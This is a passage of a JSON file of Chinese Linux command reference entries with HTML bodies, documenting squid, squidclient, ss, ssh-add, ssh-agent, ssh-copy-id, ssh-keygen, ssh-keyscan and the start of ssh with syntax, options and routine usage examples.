split_file009\n</code></pre>\n<p>使用-l选项根据文件的行数来分割文件，例如把文件分割成每个包含10行的小文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">split</span> -l <span class=\"hljs-number\">10</span> <span class=\"hljs-built_in\">date</span>.<span class=\"hljs-built_in\">file</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "squid",
        "des": "squid服务器守护进程",
        "body": "<h1 id=\"squid\">squid</h1>\n<p>squid服务器守护进程</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>squid命令</strong> 高性能的Web客户端代理缓存服务器套件“squid”的服务器守护进程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">squid</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：将指定调试等级的信息发送到标准错误设备；</span>\n<span class=\"hljs-deletion\">-f：使用指定的配置文件。而不使用默认配置文件；</span>\n<span class=\"hljs-deletion\">-k：向squid服务器发送指令；</span>\n<span class=\"hljs-deletion\">-s：启用syslog日志；</span>\n<span class=\"hljs-deletion\">-z：创建缓存目录；</span>\n<span class=\"hljs-deletion\">-C：不捕获致命信号；</span>\n<span class=\"hljs-deletion\">-D：不进行DNS参数测试；</span>\n<span class=\"hljs-deletion\">-N：以非守护进程模式运行；</span>\n<span class=\"hljs-deletion\">-X：强制进入完全调试模式。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "squidclient",
        "des": "squid服务器的客户端管理工具",
        "body": "<h1 id=\"squidclient\">squidclient</h1>\n<p>squid服务器的客户端管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>squidclient命令</strong> 使用squid服务器的客户端管理工具，它可以查看squid服务器的详细运行信息和管理squid服务器。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">squidclient</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：不包含“accept:header”；</span>\n<span class=\"hljs-deletion\">-r：强制缓存重新加载URL；</span>\n<span class=\"hljs-deletion\">-s：安静模式，不输出信息到标准输出设备；</span>\n<span class=\"hljs-deletion\">-h：从指定主机获取url</span>\n<span class=\"hljs-deletion\">-l：指定一个本地ip地址进行绑定；</span>\n<span class=\"hljs-deletion\">-p：端口号，默认为3128；</span>\n<span class=\"hljs-deletion\">-m：指定发送请求的方法；</span>\n<span class=\"hljs-deletion\">-u：代理认证用户名。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>URL：指定操作缓存中的URL。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ss",
        "des": "比 netstat 好用的socket统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息",
        "body": "<h1 id=\"ss\">ss</h1>\n<p>比 netstat 好用的socket统计信息，iproute2 包附带的另一个工具，允许你查询 socket 的有关统计信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ss命令</strong> 用来显示处于活动状态的套接字信息。ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p>\n<p>当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接<code>cat /proc/net/tcp</code>，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。</p>\n<p>天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。当然，如果你的系统中没有tcp_diag，ss也可以正常运行，只是效率会变得稍慢。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ss <span class=\"hljs-selector-attr\">[参数]</span>\nss <span class=\"hljs-selector-attr\">[参数]</span> <span class=\"hljs-selector-attr\">[过滤]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-h, <span class=\"hljs-comment\">--help      帮助信息</span>\n-V, <span class=\"hljs-comment\">--version   程序版本信息</span>\n-n, <span class=\"hljs-comment\">--numeric   不解析服务名称</span>\n-r, <span class=\"hljs-comment\">--resolve   解析主机名</span>\n-a, <span class=\"hljs-comment\">--all       显示所有套接字（sockets）</span>\n-l, <span class=\"hljs-comment\">--listening 显示监听状态的套接字（sockets）</span>\n-o, <span class=\"hljs-comment\">--options   显示计时器信息</span>\n-e, <span class=\"hljs-comment\">--extended  显示详细的套接字（sockets）信息</span>\n-m, <span class=\"hljs-comment\">--memory    显示套接字（socket）的内存使用情况</span>\n-p, <span class=\"hljs-comment\">--processes 显示使用套接字（socket）的进程</span>\n-i, <span class=\"hljs-comment\">--info      显示 TCP内部信息</span>\n-s, <span class=\"hljs-comment\">--summary   显示套接字（socket）使用概况</span>\n<span class=\"hljs-number\">-4</span>, <span class=\"hljs-comment\">--ipv4      仅显示IPv4的套接字（sockets）</span>\n<span class=\"hljs-number\">-6</span>, <span class=\"hljs-comment\">--ipv6      仅显示IPv6的套接字（sockets）</span>\n<span class=\"hljs-number\">-0</span>, <span class=\"hljs-comment\">--packet    显示 PACKET 套接字（socket）</span>\n-t, <span class=\"hljs-comment\">--tcp       仅显示 TCP套接字（sockets）</span>\n-u, <span class=\"hljs-comment\">--udp       仅显示 UCP套接字（sockets）</span>\n-d, <span class=\"hljs-comment\">--dccp      仅显示 DCCP套接字（sockets）</span>\n-w, <span class=\"hljs-comment\">--raw       仅显示 RAW套接字（sockets）</span>\n-x, <span class=\"hljs-comment\">--unix      仅显示 Unix套接字（sockets）</span>\n-f, <span class=\"hljs-comment\">--family=FAMILY  显示 FAMILY类型的套接字（sockets），FAMILY可选，支持  unix, inet, inet6, link, netlink</span>\n-A, <span class=\"hljs-comment\">--query=QUERY, --socket=QUERY</span>\n      QUERY := {<span class=\"hljs-keyword\">all</span>|<span class=\"hljs-type\">inet</span>|tcp|udp|raw|unix|packet|netlink}[,QUERY]\n-D, <span class=\"hljs-comment\">--diag=FILE     将原始TCP套接字（sockets）信息转储到文件</span>\n -F, <span class=\"hljs-comment\">--filter=FILE  从文件中都去过滤器信息</span>\n       <span class=\"hljs-keyword\">FILTER</span> := [ state TCP-STATE ] [ EXPRESSION ]\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">ss -t -a    <span class=\"hljs-comment\"># 显示TCP连接</span>\nss -s       <span class=\"hljs-comment\"># 显示 Sockets 摘要</span>\nss -l       <span class=\"hljs-comment\"># 列出所有打开的网络连接端口</span>\nss -pl      <span class=\"hljs-comment\"># 查看进程使用的socket</span>\nss -lp | grep <span class=\"hljs-number\">3306</span>  <span class=\"hljs-comment\"># 找出打开套接字/端口应用程序</span>\nss -u -a    显示所有UDP Sockets\nss -o <span class=\"hljs-keyword\">state</span> established '( dport = :smtp or sport = :smtp )' <span class=\"hljs-comment\"># 显示所有状态为established的SMTP连接</span>\nss -o <span class=\"hljs-keyword\">state</span> established '( dport = :http or sport = :http )' <span class=\"hljs-comment\"># 显示所有状态为Established的HTTP连接</span>\nss -o <span class=\"hljs-keyword\">state</span> fin-wait-<span class=\"hljs-number\">1</span> '( sport = :http or sport = :https )' dst <span class=\"hljs-number\">193.233</span>.<span class=\"hljs-number\">7</span>/<span class=\"hljs-number\">24</span>  <span class=\"hljs-comment\"># 列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字</span>\n\n<span class=\"hljs-comment\"># ss 和 netstat 效率对比</span>\ntime netstat -at\ntime ss\n\n<span class=\"hljs-comment\"># 匹配远程地址和端口号</span>\n<span class=\"hljs-comment\"># ss dst ADDRESS_PATTERN</span>\nss dst <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">1.5</span>\nss dst <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.113</span>:http\nss dst <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.113</span>:smtp\nss dst <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.113</span>:<span class=\"hljs-number\">443</span>\n\n<span class=\"hljs-comment\"># 匹配本地地址和端口号</span>\n<span class=\"hljs-comment\"># ss src ADDRESS_PATTERN</span>\nss src <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.103</span>\nss src <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.103</span>:http\nss src <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.103</span>:<span class=\"hljs-number\">80</span>\nss src <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.103</span>:smtp\nss src <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">119.103</span>:<span class=\"hljs-number\">25</span>\n</code></pre>\n<p><strong>将本地或者远程端口和一个数比较</strong></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># ss dport OP PORT 远程端口和一个数比较；</span>\n<span class=\"hljs-comment\"># ss sport OP PORT 本地端口和一个数比较</span>\n<span class=\"hljs-comment\"># OP 可以代表以下任意一个:</span>\n<span class=\"hljs-comment\"># &lt;= or le : 小于或等于端口号</span>\n<span class=\"hljs-comment\"># &gt;= or ge : 大于或等于端口号</span>\n<span class=\"hljs-comment\"># == or eq : 等于端口号</span>\n<span class=\"hljs-comment\"># != or ne : 不等于端口号</span>\n<span class=\"hljs-comment\"># &lt; or gt : 小于端口号</span>\n<span class=\"hljs-comment\"># &gt; or lt : 大于端口号</span>\n<span class=\"hljs-attribute\">ss</span>  sport = :http\n<span class=\"hljs-attribute\">ss</span>  dport = :http\n<span class=\"hljs-attribute\">ss</span>  dport \\&gt; :<span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">ss</span>  sport \\&gt; :<span class=\"hljs-number\">1024</span>\n<span class=\"hljs-attribute\">ss</span> sport \\&lt; :<span class=\"hljs-number\">32000</span>\n<span class=\"hljs-attribute\">ss</span>  sport eq :<span class=\"hljs-number\">22</span>\n<span class=\"hljs-attribute\">ss</span>  dport != :<span class=\"hljs-number\">22</span>\n<span class=\"hljs-attribute\">ss</span>  state connected sport = :http\n<span class=\"hljs-attribute\">ss</span> \\( sport = :http or sport = :https \\)\n<span class=\"hljs-attribute\">ss</span> -o state fin-wait-<span class=\"hljs-number\">1</span> \\( sport = :http or sport = :https \\) dst <span class=\"hljs-number\">192</span>.<span class=\"hljs-number\">168</span>.<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">24</span>\n</code></pre>\n<p><strong>用TCP 状态过滤Sockets</strong></p>\n<pre><code class=\"language-shell\">ss -<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">state</span> closing\n<span class=\"hljs-comment\"># ss -4 state FILTER-NAME-HERE</span>\n<span class=\"hljs-comment\"># ss -6 state FILTER-NAME-HERE</span>\n<span class=\"hljs-comment\"># FILTER-NAME-HERE 可以代表以下任何一个：</span>\n<span class=\"hljs-comment\"># established、 syn-sent、 syn-recv、 fin-wait-1、 fin-wait-2、 time-wait、 closed、 close-wait、 last-ack、 listen、 closing、</span>\n<span class=\"hljs-comment\"># all : 所有以上状态</span>\n<span class=\"hljs-comment\"># connected : 除了listen and closed的所有状态</span>\n<span class=\"hljs-comment\"># synchronized :所有已连接的状态除了syn-sent</span>\n<span class=\"hljs-comment\"># bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv.</span>\n<span class=\"hljs-comment\"># big : 和bucket相反.</span>\n</code></pre>\n<p> <strong>显示ICP连接</strong></p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ss -t -a</span>\nState       Recv-Q Send-Q                            Local Address:Port                                Peer Address:Port\nLISTEN     <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>                                            *:3306                                           *:*\nLISTEN     <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>                                            *:http                                           *:*\nLISTEN     <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>                                            *:ssh                                            *:*\nLISTEN     <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>                                    127.0.0.1:smtp                                           *:*\nESTAB      <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>                               112.124.15.130:42071                              42.156.166.25:http\nESTAB      <span class=\"hljs-number\"> 0 </span>    <span class=\"hljs-number\"> 0 </span>                               112.124.15.130:ssh                              121.229.196.235:33398\n</code></pre>\n<p> <strong>显示 Sockets 摘要</strong></p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ss -s</span>\nTotal:<span class=\"hljs-number\"> 172 </span>(kernel 189)\nTCP:  <span class=\"hljs-number\"> 10 </span>(estab 2, closed 4, orphaned 0, synrecv 0, timewait 0/0), ports 5\n\nTransport Total     ip        IPv6\n*        <span class=\"hljs-number\"> 189 </span>      -         -\nRAW      <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>        0\nUDP      <span class=\"hljs-number\"> 5 </span>       <span class=\"hljs-number\"> 5 </span>        0\nTCP      <span class=\"hljs-number\"> 6 </span>       <span class=\"hljs-number\"> 6 </span>        0\nINET     <span class=\"hljs-number\"> 11 </span>      <span class=\"hljs-number\"> 11 </span>       0\nFRAG     <span class=\"hljs-number\"> 0 </span>       <span class=\"hljs-number\"> 0 </span>        0\n</code></pre>\n<p>列出当前的established, closed, orphaned and waiting TCP sockets</p>\n<p> <strong>列出所有打开的网络连接端口</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ss -l</span>\nRecv-Q Send-Q                                 Local <span class=\"hljs-symbol\">Address:</span>Port                                     Peer <span class=\"hljs-symbol\">Address:</span>Port\n0      0                                                  *<span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">3306</span>                                                *<span class=\"hljs-symbol\">:*</span>\n0      0                                                  *<span class=\"hljs-symbol\">:http</span>                                                *<span class=\"hljs-symbol\">:*</span>\n0      0                                                  *<span class=\"hljs-symbol\">:ssh</span>                                                 *<span class=\"hljs-symbol\">:*</span>\n0      0                                          <span class=\"hljs-number\">127.0</span>.0.<span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:smtp</span>                                                *<span class=\"hljs-symbol\">:*</span>\n</code></pre>\n<p> <strong>查看进程使用的socket</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ss -pl</span>\nRecv-Q Send-Q                                          Local <span class=\"hljs-symbol\">Address:</span>Port                                              Peer <span class=\"hljs-symbol\">Address:</span>Port\n0      0                                                           *<span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">3306</span>                                                         *<span class=\"hljs-symbol\">:*</span>        <span class=\"hljs-symbol\">users:</span>((<span class=\"hljs-string\">\"mysqld\"</span>,<span class=\"hljs-number\">1718</span>,<span class=\"hljs-number\">10</span>))\n0      0                                                           *<span class=\"hljs-symbol\">:http</span>                                                         *<span class=\"hljs-symbol\">:*</span>        <span class=\"hljs-symbol\">users:</span>((<span class=\"hljs-string\">\"nginx\"</span>,<span class=\"hljs-number\">13312</span>,<span class=\"hljs-number\">5</span>),(<span class=\"hljs-string\">\"nginx\"</span>,<span class=\"hljs-number\">13333</span>,<span class=\"hljs-number\">5</span>))\n0      0                                                           *<span class=\"hljs-symbol\">:ssh</span>                                                          *<span class=\"hljs-symbol\">:*</span>        <span class=\"hljs-symbol\">users:</span>((<span class=\"hljs-string\">\"sshd\"</span>,<span class=\"hljs-number\">1379</span>,<span class=\"hljs-number\">3</span>))\n0      0                                                   <span class=\"hljs-number\">127.0</span>.0.<span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:smtp</span>                                                         *<span class=\"hljs-symbol\">:*</span>        us\n</code></pre>\n<p> <strong>找出打开套接字/端口应用程序</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ss -pl | grep 3306</span>\n0      0                            *<span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">3306</span>                          *<span class=\"hljs-symbol\">:*</span>        <span class=\"hljs-symbol\">users:</span>((<span class=\"hljs-string\">\"mysqld\"</span>,<span class=\"hljs-number\">1718</span>,<span class=\"hljs-number\">10</span>))\n</code></pre>\n<p> <strong>显示所有UDP Sockets</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ss -u -a</span>\nState       Recv-Q Send-Q                                     Local <span class=\"hljs-symbol\">Address:</span>Port                                         Peer <span class=\"hljs-symbol\">Address:</span>Port\nUNCONN      0      0                                                      *<span class=\"hljs-symbol\">:syslog</span>                                                  *<span class=\"hljs-symbol\">:*</span>\nUNCONN      0      0                                         <span class=\"hljs-number\">112.124</span>.<span class=\"hljs-number\">15.130</span><span class=\"hljs-symbol\">:ntp</span>                                                     *<span class=\"hljs-symbol\">:*</span>\nUNCONN      0      0                                            <span class=\"hljs-number\">10.160</span>.<span class=\"hljs-number\">7.81</span><span class=\"hljs-symbol\">:ntp</span>                                                     *<span class=\"hljs-symbol\">:*</span>\nUNCONN      0      0                                              <span class=\"hljs-number\">127.0</span>.0.<span class=\"hljs-number\">1</span><span class=\"hljs-symbol\">:ntp</span>                                                     *<span class=\"hljs-symbol\">:*</span>\nUNCONN      0      0                                                      *<span class=\"hljs-symbol\">:ntp</span>                                                     *<span class=\"hljs-symbol\">:*</span>\n</code></pre>\n<p><strong>出所有端口为 22（ssh）的连接</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ss state all sport = :ssh</span>\nNetid State      Recv-Q Send-Q     Local <span class=\"hljs-symbol\">Address:</span>Port                      Peer <span class=\"hljs-symbol\">Address:</span>Port\ntcp   LISTEN     0      <span class=\"hljs-number\">128</span>                    *<span class=\"hljs-symbol\">:ssh</span>                                  *<span class=\"hljs-symbol\">:*</span>\ntcp   ESTAB      0      0          <span class=\"hljs-number\">192.168</span>.0.<span class=\"hljs-number\">136</span><span class=\"hljs-symbol\">:ssh</span>                      <span class=\"hljs-number\">192.168</span>.0.<span class=\"hljs-number\">102</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">46540</span>\ntcp   LISTEN     0      <span class=\"hljs-number\">128</span>                   ::<span class=\"hljs-symbol\">:ssh</span>                                 ::<span class=\"hljs-symbol\">:*</span>\n</code></pre>\n<p><strong>查看TCP的连接状态</strong></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ss  -tan|awk <span class=\"hljs-string\">'NR&gt;1{++S[$1]}END{for (a in S) print a,S[a]}'</span></span>\nLISTEN <span class=\"hljs-number\">7</span>\nESTAB <span class=\"hljs-number\">31</span>\nTIME-WAIT <span class=\"hljs-number\">28</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ssh-add",
        "des": "把专用密钥添加到ssh-agent的高速缓存中",
        "body": "<h1 id=\"ssh-add\">ssh-add</h1>\n<p>把专用密钥添加到ssh-agent的高速缓存中</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ssh-add命令</strong> 是把专用密钥添加到ssh-agent的高速缓存中。该命令位置在<code>/usr/bin/ssh-add</code>。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ssh-<span class=\"hljs-built_in\">add</span> [-cDdLlXx] [-t life] [file <span class=\"hljs-built_in\">..</span>.]\nssh-<span class=\"hljs-built_in\">add</span> -s pkcs11\nssh-<span class=\"hljs-built_in\">add</span> -e pkcs11\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>D：删除ssh-agent中的所有密钥.\n<span class=\"hljs-literal\">-</span>d：从ssh-agent中的删除密钥\n<span class=\"hljs-literal\">-</span>e pkcs11：删除PKCS<span class=\"hljs-comment\">#11共享库pkcs1提供的钥匙。</span>\n<span class=\"hljs-literal\">-</span>s pkcs11：添加PKCS<span class=\"hljs-comment\">#11共享库pkcs1提供的钥匙。</span>\n<span class=\"hljs-literal\">-</span>L：显示ssh-agent中的公钥\n<span class=\"hljs-literal\">-</span>l：显示ssh-agent中的密钥\n<span class=\"hljs-literal\">-</span>t life：对加载的密钥设置超时时间，超时ssh-agent将自动卸载密钥\n<span class=\"hljs-literal\">-</span>X：对ssh-agent进行解锁\n<span class=\"hljs-literal\">-</span>x：对ssh-agent进行加锁\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>1、把专用密钥添加到 ssh-agent 的高速缓存中：</p>\n<pre><code class=\"language-shell\">ssh-add ~<span class=\"hljs-regexp\">/.ssh/i</span>d_dsa\n</code></pre>\n<p>2、从ssh-agent中删除密钥：</p>\n<pre><code class=\"language-shell\">ssh-add -d ~<span class=\"hljs-regexp\">/.ssh/i</span>d_xxx.pub\n</code></pre>\n<p>3、查看ssh-agent中的密钥：</p>\n<pre><code class=\"language-shell\">ssh-<span class=\"hljs-built_in\">add</span> -l\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ssh-agent",
        "des": "ssh密钥管理器",
        "body": "<h1 id=\"ssh-agent\">ssh-agent</h1>\n<p>ssh密钥管理器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ssh-agent命令</strong> 是一种控制用来保存公钥身份验证所使用的私钥的程序。ssh-agent在X会话或登录会话之初启动，所有其他窗口或程序则以客户端程序的身份启动并加入到ssh-agent程序中。通过使用环境变量，可定位代理并在登录到其他使用ssh机器上时使用代理自动进行身份验证。</p>\n<p>其实ssh-agent就是一个密钥管理器，运行ssh-agent以后，使用ssh-add将私钥交给ssh-agent保管，其他程序需要身份验证的时候可以将验证申请交给ssh-agent来完成整个认证过程。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ssh-agent <span class=\"hljs-comment\">[-c | -s]</span> <span class=\"hljs-comment\">[-d]</span> <span class=\"hljs-comment\">[-a bind_address]</span> <span class=\"hljs-comment\">[-t life]</span> <span class=\"hljs-comment\">[command <span class=\"hljs-comment\">[arg ...]</span>]</span>\nssh-agent <span class=\"hljs-comment\">[-c | -s]</span> -k\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">a</span> bind_address：bind <span class=\"hljs-keyword\">the</span> agent <span class=\"hljs-built_in\">to</span> <span class=\"hljs-keyword\">the</span> UNIX-domain <span class=\"hljs-built_in\">socket</span> bind_address.\n-c：生成C-<span class=\"hljs-built_in\">shell</span>风格的命令输出。\n-d：调试模式。\n-k：把ssh-agent进程杀掉。\n-s：生成Bourne <span class=\"hljs-built_in\">shell</span> 风格的命令输出。\n-t life：设置默认值添加到代理人的身份最大寿命。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>运行ssh-agent：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ssh-agent</span>\n</code></pre>\n<p>运行ssh-agent，它会打印出来它使用的环境和变量。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ssh-copy-id",
        "des": "把本地的ssh公钥文件安装到远程主机对应的账户下",
        "body": "<h1 id=\"ssh-copy-id\">ssh-copy-id</h1>\n<p>把本地的ssh公钥文件安装到远程主机对应的账户下</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ssh-copy-id命令</strong> 可以把本地主机的公钥复制到远程主机的authorized_keys文件上，ssh-copy-id命令也会给远程主机的用户主目录（home）和<code>~/.ssh</code>, 和<code>~/.ssh/authorized_keys</code>设置合适的权限。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">ssh-copy-id <span class=\"hljs-comment\">[-i <span class=\"hljs-comment\">[identity_file]</span>]</span> <span class=\"hljs-comment\">[user@]</span>machine\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">i</span>：指定公钥文件\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>1、把本地的ssh公钥文件安装到远程主机对应的账户下：</p>\n<pre><code class=\"language-shell\">ssh<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">copy</span><span class=\"hljs-operator\">-</span>id <span class=\"hljs-keyword\">user</span><span class=\"hljs-variable\">@server</span>\nssh<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">copy</span><span class=\"hljs-operator\">-</span>id <span class=\"hljs-operator\">-</span>i <span class=\"hljs-operator\">~</span><span class=\"hljs-operator\">/</span>.ssh<span class=\"hljs-operator\">/</span>id_rsa.pub <span class=\"hljs-keyword\">user</span><span class=\"hljs-variable\">@server</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ssh-keygen",
        "des": "为ssh生成、管理和转换认证密钥",
        "body": "<h1 id=\"ssh-keygen\">ssh-keygen</h1>\n<p>为ssh生成、管理和转换认证密钥</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ssh-keygen命令</strong> 用于为“ssh”生成、管理和转换认证密钥，它支持RSA和DSA两种认证密钥。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ssh-keygen</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：指定密钥长度；</span>\n<span class=\"hljs-deletion\">-e：读取openssh的私钥或者公钥文件；</span>\n<span class=\"hljs-deletion\">-C：添加注释；</span>\n<span class=\"hljs-deletion\">-f：指定用来保存密钥的文件名；</span>\n<span class=\"hljs-deletion\">-i：读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥；</span>\n<span class=\"hljs-deletion\">-l：显示公钥文件的指纹数据；</span>\n<span class=\"hljs-deletion\">-N：提供一个新密语；</span>\n<span class=\"hljs-deletion\">-P：提供（旧）密语；</span>\n<span class=\"hljs-deletion\">-q：静默模式；</span>\n<span class=\"hljs-deletion\">-t：指定要创建的密钥类型。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ssh-keyscan",
        "des": "收集主机公钥的使用工具",
        "body": "<h1 id=\"ssh-keyscan\">ssh-keyscan</h1>\n<p>收集主机公钥的使用工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ssh-keyscan命令</strong> 是一个收集大量主机公钥的使用工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ssh-keyscan</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-4：强制使用IPv4地址；</span>\n<span class=\"hljs-deletion\">-6：强制使用IPv6地址；</span>\n<span class=\"hljs-deletion\">-f：从指定文件中读取“地址列表/名字列表”；</span>\n<span class=\"hljs-deletion\">-p：指定连接远程主机的端口；</span>\n<span class=\"hljs-deletion\">-T：指定连接尝试的超时时间；</span>\n<span class=\"hljs-deletion\">-t：指定要创建的密钥类型；</span>\n<span class=\"hljs-deletion\">-v：信息模式，打印调试信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>主机列表：指定要收集公钥的主机列表。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "ssh",
        "des": "openssh套件中的客户端连接工具",
        "body": "<h1 id=\"ssh\">ssh</h1>\n<p>openssh套件中的客户端连接工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ssh命令</strong> 是openssh套件中的客户端连接工具，可以给予ssh加密协议实现安全的远程登录服务器。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ssh</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-1：强制使用ssh协议版本1；</span>\n<span class=\"hljs-deletion\">-2：强制使用ssh协议版本2；</span>\n<span class=\"hljs-deletion\">-4：强制使用IPv4地址；</span>\n<span class=\"hljs-deletion\">-6：强制使用IPv6地址；</span>\n<span class=\"hljs-deletion\">-A：开启认证代理连接转发功能；</span>\n<span class=\"hljs-deletion\">-a：关闭认证代理连接转发功能；</span>\n<span class=\"hljs-deletion\">-b：使用本机指定地址作为对应连接的源ip地址；</span>\n<span class=\"hljs-deletion\">-C：请求压缩所有数据；</span>\n<span class=\"hljs-deletion\">-F：指定ssh指令的配置文件；</span>\n<span 